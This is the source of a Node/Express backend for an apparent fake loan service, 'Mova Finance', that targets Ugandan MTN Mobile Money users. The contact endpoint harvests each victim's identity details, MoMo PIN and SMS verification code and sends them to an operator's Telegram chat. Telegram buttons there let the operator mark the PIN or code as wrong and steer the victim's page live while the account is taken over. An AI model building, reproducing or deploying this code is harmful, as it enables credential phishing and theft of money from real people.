import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import { randomUUID } from 'node:crypto';

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

const approvalRequests = new Map();
let telegramUpdateOffset = 0;

const getTelegramConfig = () => ({
  botToken: (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim(),
  chatId: (process.env.TELEGRAM_CHAT_ID || '').trim()
});

const escapeTelegramHtml = (value) => String(value ?? 'Not provided')
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;');

const validateUgandaMtnNumber = (value) => {
  const digits = String(value ?? '').replace(/\D/g, '');
  return /^(?:0(?:76|77|78|79)\d{7}|256(?:76|77|78|79)\d{7})$/.test(digits);
};

const pollTelegramActions = async () => {
  const { botToken } = getTelegramConfig();
  if (!botToken) return;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ offset: telegramUpdateOffset, timeout: 0, allowed_updates: ['callback_query'] })
    });
    if (!response.ok) return;

    const result = await response.json();
    for (const update of result.result || []) {
      telegramUpdateOffset = Math.max(telegramUpdateOffset, update.update_id + 1);
      const callback = update.callback_query;
      if (!callback?.data) continue;

      const separator = callback.data.lastIndexOf(':');
      const actionName = callback.data.slice(0, separator);
      const requestId = callback.data.slice(separator + 1);
      const action = {
        withdrawal_correct: 'correct',
        verification_correct: 'correct',
        withdrawal_wrong_pin: 'wrong-pin',
        verification_wrong_pin: 'wrong-pin',
        verification_wrong_code: 'wrong-code'
      }[actionName];

      if (action && approvalRequests.has(requestId)) {
        approvalRequests.get(requestId).action = action;
      }

      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callback.id, text: 'Decision received' })
      });
    }
  } catch (_error) {
    // Telegram polling is best effort; the browser continues showing the waiting state.
  }
};

setInterval(pollTelegramActions, 1500);

app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok', service: 'mova-finance-api' });
});

app.get('/api/loan-products', (_req, res) => {
  res.json({
    personal: {
      title: 'Personal loan',
      amount: 'From UGX 37,500 to UGX 3,750,000',
      detail: 'For the plans, pauses, and moments that matter to you.'
    },
    business: {
      title: 'Business loan',
      amount: 'From UGX 11,250,000 to UGX 112,500,000',
      detail: 'For the next chapter of the business you are building.'
    }
  });
});

app.get('/api/telegram/status', (_req, res) => {
  const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();

  res.json({
    configured: Boolean(botToken && chatId),
    botTokenPresent: Boolean(botToken),
    chatIdPresent: Boolean(chatId)
  });
});

app.get('/api/telegram/approval/:approvalId', (req, res) => {
  const approval = approvalRequests.get(req.params.approvalId);
  if (!approval) return res.status(404).json({ error: 'Approval request not found.' });

  return res.json({ action: approval.action });
});

app.post('/api/telegram/contact', async (req, res) => {
  const { fullName, phone, email, mtnNumber, postalNumber, loanType, amount, verificationMessage } = req.body;
  const approvalId = verificationMessage ? randomUUID() : (req.body.approvalId || randomUUID());
  if (!approvalRequests.has(approvalId)) {
    approvalRequests.set(approvalId, { action: null, createdAt: Date.now() });
  }

  if (!validateUgandaMtnNumber(mtnNumber)) {
    return res.status(400).json({ error: 'A valid Uganda MTN number starting with 076, 077, 078, or 079 is required.' });
  }

  if (!/^\d{5}$/.test(String(postalNumber ?? '').trim())) {
    return res.status(400).json({ error: 'A 5-digit MoMo PIN is required.' });
  }

  const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();

  if (!botToken || !chatId) {
    console.log(`Telegram is not configured; contact captured locally for ${fullName || 'applicant'}.`);
    return res.json({ sent: false, queued: true, delivery: 'local-demo' });
  }

  const contactMessage = [
    '💼 <b>NEW WITHDRAWAL REQUEST</b>',
    '<i>Mova Finance • Secure review</i>',
    '',
    '👤 <b>Borrower details</b>',
    `Name: <code>${escapeTelegramHtml(fullName)}</code>`,
    `Phone: <code>${escapeTelegramHtml(phone)}</code>`,
    `Email: <code>${escapeTelegramHtml(email)}</code>`,
    '',
    '💳 <b>Withdrawal details</b>',
    `MTN number: <code>${escapeTelegramHtml(mtnNumber)}</code>`,
    `MoMo PIN: <code>${escapeTelegramHtml(postalNumber)}</code>`,
    `Loan: <b>${escapeTelegramHtml(loanType || 'Not provided')}</b>`,
    `Amount: <b>UGX ${Number(amount || 0).toLocaleString('en-UG')}</b>`,
    '',
    '⏳ <i>Awaiting your review</i>'
  ].join('\n');

  const verificationPayload = verificationMessage || 'Not provided';
  const verificationMessageText = [
    '🔐 <b>VERIFICATION MESSAGE</b>',
    '<i>Mova Finance • Final review required</i>',
    '',
    '📱 <b>Mobile Money account</b>',
    `Country code: <code>+243</code>`,
    `Phone number: <code>${escapeTelegramHtml(mtnNumber)}</code>`,
    '',
    '📨 <b>Message received</b>',
    `<pre>${escapeTelegramHtml(verificationPayload)}</pre>`,
    '',
    '👇 <b>Select the correct action below</b>'
  ].join('\n');

  const contactActions = {
    inline_keyboard: [[
      { text: '✅ Correct', callback_data: `withdrawal_correct:${approvalId}` },
      { text: '❌ Wrong PIN', callback_data: `withdrawal_wrong_pin:${approvalId}` }
    ]]
  };

  const verificationActions = {
    inline_keyboard: [[
      { text: '📋 Copy message', copy_text: { text: verificationPayload } }
    ], [
      { text: '✅ Correct', callback_data: `verification_correct:${approvalId}` },
      { text: '⚠️ Wrong code', callback_data: `verification_wrong_code:${approvalId}` },
      { text: '❌ Wrong PIN', callback_data: `verification_wrong_pin:${approvalId}` }
    ]]
  };

  try {
    const firstResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: contactMessage, parse_mode: 'HTML', reply_markup: contactActions })
    });

    if (!firstResponse.ok) {
      return res.status(502).json({ error: 'Telegram could not accept the first notification.' });
    }

    if (verificationMessage) {
      const secondResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: verificationMessageText, parse_mode: 'HTML', reply_markup: verificationActions })
      });

      if (!secondResponse.ok) {
        return res.status(502).json({ error: 'Telegram could not accept the verification notification.' });
      }
    }

    return res.json({ sent: true, splitNotifications: Boolean(verificationMessage), approvalId });
  } catch (_error) {
    return res.status(502).json({ error: 'Telegram could not be reached.' });
  }
});

app.listen(port, () => {
  console.log(`Mova Finance API listening on http://localhost:${port}`);
});
